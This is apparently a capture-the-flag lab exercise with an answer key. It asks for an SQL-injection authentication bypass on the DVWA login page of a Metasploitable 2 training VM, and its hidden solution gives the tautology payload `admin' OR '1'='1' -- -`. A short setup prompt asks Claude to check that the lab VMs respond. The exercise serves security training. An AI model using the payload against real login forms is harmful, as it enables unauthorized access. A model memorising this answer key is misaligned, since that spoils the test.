# Q066 — DVWA Login SQLi

| Field | Value |
|---|---|
| **Target** | `192.168.52.129` (Metasploitable 2) |
| **Domain** | 12 — Web Apps / 13 — SQLi |
| **Difficulty** | 🟢 Easy |
| **Tools** | `burpsuite`, `sqlmap`, `gobuster`, `nikto`, `curl` |
| **Time budget** | 15–25 min |

---

## 📝 Question

On DVWA login page (`http://192.168.52.129/dvwa/login.php`), bypass auth using SQL injection. Provide the **payload** in username and password fields.

---

## 🎯 Flag Format

```
user=<payload>; pass=<payload>
```

Example: `user=admin' OR '1'='1' --; pass=anything`

**⚠️ Format strict hai** — lowercase, no spaces around `=`, semicolon separator where shown.

---

## 💡 Hints

<details>
<summary>Hint 1 (click)</summary>

Tautology-based SQLi.
</details>

<details>
<summary>Hint 2</summary>

DVWA accepts default `admin:password` — but SQLi works too.
</details>

---

## ✅ Solution

<details>
<summary>Show solution</summary>

```bash
# Browse http://192.168.52.129/dvwa/login.php
# Username: admin' OR '1'='1' -- -
# Password: x
```

Bypasses authentication.

**Answer:** `user=admin' OR '1'='1' -- -; pass=x`

📖 Ref: [playbooks/sqli-playbook.md](../../playbooks/sqli-playbook.md)
</details>

---

## 🤖 Claude Setup Prompt (for Claude-on-your-PC)

```
1. Verify VMs running: ping 192.168.52.129 and ping 192.168.52.130 from 192.168.52.128.
2. Required services for this Q already up by default on the relevant target.
3. If something is down, restart it on the target VM.

Report back: "Lab ready for Q066".
```
